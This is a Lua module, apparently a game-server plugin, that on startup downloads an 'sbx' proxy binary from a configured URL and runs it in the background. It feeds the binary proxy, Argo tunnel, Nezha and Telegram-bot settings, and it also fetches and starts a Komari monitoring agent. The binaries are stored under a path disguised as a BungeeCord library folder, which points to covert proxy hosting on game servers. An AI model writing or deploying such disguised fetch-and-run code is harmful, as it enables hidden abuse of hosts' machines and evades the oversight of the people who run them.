SbxManager = {}
SbxManager.sbx_pid = nil
SbxManager.komari_pid = nil

local ALL_ENV_VARS = {
    "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
    "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
    "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
    "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT",
    "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
    "KOMARI_ENDPOINT", "KOMARI_TOKEN"
}

local function table_has_value(tbl, value)
    for _, v in ipairs(tbl) do
        if v == value then return true end
    end
    return false
end

local function trim(s)
    return (s:gsub("^%s*(.-)%s*$", "%1"))
end

local function join_path(...)
    if FS and FS.ConcatPaths then
        return FS.ConcatPaths(...)
    end
    local parts = {...}
    return table.concat(parts, "/")
end

local function ensure_dir(path)
    if FS and FS.Exists and FS.Exists(path) then return end
    if MP.GetOSName() == "Windows" then
        os.execute(string.format('mkdir "%s"', path))
    else
        os.execute(string.format('mkdir -p "%s"', path))
    end
end

local function shell_escape_posix(value)
    local v = tostring(value or "")
    v = v:gsub("'", "'\\''")
    return "'" .. v .. "'"
end

local function read_env_file(path, env)
    local file = io.open(path, "r")
    if not file then return false end
    for line in file:lines() do
        line = trim(line)
        if line ~= "" and not line:match("^#") then
            line = line:gsub("%s+#.*$", ""):gsub("%s+//.*$", "")
            line = trim(line)
            if line:sub(1, 7) == "export " then
                line = trim(line:sub(8))
            end
            local key, value = line:match("^([^=]+)=(.*)$")
            if key and value then
                key = trim(key)
                value = trim(value):gsub("^['\"]|['\"]$", "")
                if table_has_value(ALL_ENV_VARS, key) then
                    env[key] = value
                end
            end
        end
    end
    file:close()
    return true
end

local function load_env_files(env)
    local candidates = {}
    local script_path = Utils.script_path()
    table.insert(candidates, join_path(script_path, ".env"))
    table.insert(candidates, join_path(script_path, "..", ".env"))
    table.insert(candidates, ".env")
    local home = os.getenv("HOME") or os.getenv("USERPROFILE")
    if home and home ~= "" then
        table.insert(candidates, join_path(home, ".env"))
    end

    for _, path in ipairs(candidates) do
        if FS and FS.Exists and FS.Exists(path) then
            if read_env_file(path, env) then
                return path
            end
        else
            local f = io.open(path, "r")
            if f then
                f:close()
                if read_env_file(path, env) then
                    return path
                end
            end
        end
    end
    return nil
end

local function detect_arch()
    local arch = ""
    if MP.GetOSName() == "Windows" then
        arch = (os.getenv("PROCESSOR_ARCHITECTURE") or ""):lower()
    else
        local p = io.popen("uname -m")
        if p then
            arch = (p:read("*l") or ""):lower()
            p:close()
        end
    end

    if arch:find("amd64") or arch:find("x86_64") then return "amd64" end
    if arch:find("aarch64") or arch:find("arm64") then return "arm64" end
    if arch:find("s390x") then return "s390x" end
    return nil, arch
end

local function download_file(url, path)
    local body, code = Nickel.https.request(url)
    if code ~= 200 or not body or body == "" then
        return false, "download failed"
    end
    local f = io.open(path, "wb")
    if not f then
        return false, "cannot write file"
    end
    f:write(body)
    f:close()
    return true
end

local function make_executable(path)
    if MP.GetOSName() ~= "Windows" then
        os.execute(string.format('chmod +x "%s"', path))
    end
end

local function build_env_table(cache_dir)
    local sbx_config = ConfigManager and ConfigManager.GetSetting("sbx") or {}
    local env = {}
    local defaults = (sbx_config and sbx_config.env) or {}
    for k, v in pairs(defaults) do
        if table_has_value(ALL_ENV_VARS, k) then
            env[k] = tostring(v)
        end
    end

    for _, key in ipairs(ALL_ENV_VARS) do
        local val = os.getenv(key)
        if val and trim(val) ~= "" then
            env[key] = val
        end
    end

    load_env_files(env)

    if sbx_config and sbx_config.env then
        for k, v in pairs(sbx_config.env) do
            if table_has_value(ALL_ENV_VARS, k) and v ~= nil and trim(tostring(v)) ~= "" then
                env[k] = tostring(v)
            end
        end
    end

    env.FILE_PATH = cache_dir
    return env
end

local function build_env_prefix(env)
    local parts = {}
    for _, key in ipairs(ALL_ENV_VARS) do
        if env[key] ~= nil then
            table.insert(parts, string.format("%s=%s", key, shell_escape_posix(env[key])))
        end
    end
    return table.concat(parts, " ")
end

local function run_background(cmd)
    local handle = io.popen(cmd)
    if not handle then return nil end
    local out = handle:read("*a") or ""
    handle:close()
    return tonumber(out:match("(%d+)"))
end

local function log_msg(message, level)
    local sbx_config = ConfigManager and ConfigManager.GetSetting("sbx") or {}
    if sbx_config and sbx_config.console_log then
        Utils.nkprint(message, level)
    end
end

function SbxManager.start()
    local sbx_config = ConfigManager and ConfigManager.GetSetting("sbx") or {}
    if sbx_config and sbx_config.enabled == false then
        log_msg("sbx is disabled by config", "info")
        return
    end

    if MP.GetOSName() == "Windows" and sbx_config.disable_on_windows ~= false then
        log_msg("sbx is disabled on Windows by default", "warn")
        return
    end

    local arch, raw = detect_arch()
    if not arch then
        log_msg("Unsupported architecture: " .. tostring(raw), "error")
        return
    end

    local cache_dir = Utils.script_path() .. (sbx_config.cache_dir or ".cache/libraries/net/md_5/bungee/data")
    ensure_dir(cache_dir)

    local urls = sbx_config.urls or {}
    local url = urls[arch]
    if not url or url == "" then
        log_msg("Missing sbx download URL for arch: " .. arch, "error")
        return
    end

    local sbx_path = join_path(cache_dir, "sbx")
    if not (FS and FS.Exists and FS.Exists(sbx_path)) then
        local ok, err = download_file(url, sbx_path)
        if not ok then
            log_msg("Failed to download sbx: " .. tostring(err), "error")
            return
        end
        make_executable(sbx_path)
    end

    local env = build_env_table(cache_dir)
    local env_prefix = build_env_prefix(env)
    local log_path = join_path(cache_dir, "sbx.log")
    local cmd = string.format("cd %q && %s %q > %q 2>&1 & echo $!", cache_dir, env_prefix, sbx_path, log_path)
    local pid = run_background(cmd)
    if pid then
        SbxManager.sbx_pid = pid
        log_msg("sbx started (pid " .. tostring(pid) .. ")", "info")
    else
        log_msg("sbx start command executed", "warn")
    end

    local komari_endpoint = env.KOMARI_ENDPOINT
    local komari_token = env.KOMARI_TOKEN
    if komari_endpoint and trim(komari_endpoint) ~= "" and komari_token and trim(komari_token) ~= "" then
        SbxManager.start_komari(komari_endpoint, komari_token, cache_dir)
    end
end

function SbxManager.start_komari(endpoint, token, cache_dir)
    if MP.GetOSName() == "Windows" then
        log_msg("Komari agent supports Linux only", "warn")
        return
    end

    local arch, raw = detect_arch()
    if not arch or (arch ~= "amd64" and arch ~= "arm64") then
        log_msg("Unsupported Komari architecture: " .. tostring(raw), "error")
        return
    end

    local url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-" .. arch
    local komari_path = join_path(cache_dir, "komari-agent")
    if not (FS and FS.Exists and FS.Exists(komari_path)) then
        local ok, err = download_file(url, komari_path)
        if not ok then
            log_msg("Failed to download Komari agent: " .. tostring(err), "error")
            return
        end
        make_executable(komari_path)
    end

    local log_path = join_path(cache_dir, "komari.log")
    local cmd = string.format("cd %q && %q -e %s -t %s > %q 2>&1 & echo $!", cache_dir, komari_path, shell_escape_posix(endpoint), shell_escape_posix(token), log_path)
    local pid = run_background(cmd)
    if pid then
        SbxManager.komari_pid = pid
        log_msg("Komari agent started (pid " .. tostring(pid) .. ")", "info")
    else
        log_msg("Komari agent start command executed", "warn")
    end
end

function SbxManager.stop()
    if SbxManager.sbx_pid and MP.GetOSName() ~= "Windows" then
        os.execute("kill " .. tostring(SbxManager.sbx_pid))
        SbxManager.sbx_pid = nil
    end
    if SbxManager.komari_pid and MP.GetOSName() ~= "Windows" then
        os.execute("kill " .. tostring(SbxManager.komari_pid))
        SbxManager.komari_pid = nil
    end
end

function SbxManager.init()
    SbxManager.start()
    pcall(function()
        MP.RegisterEvent("onShutdown", function()
            SbxManager.stop()
        end)
    end)
end

return SbxManager
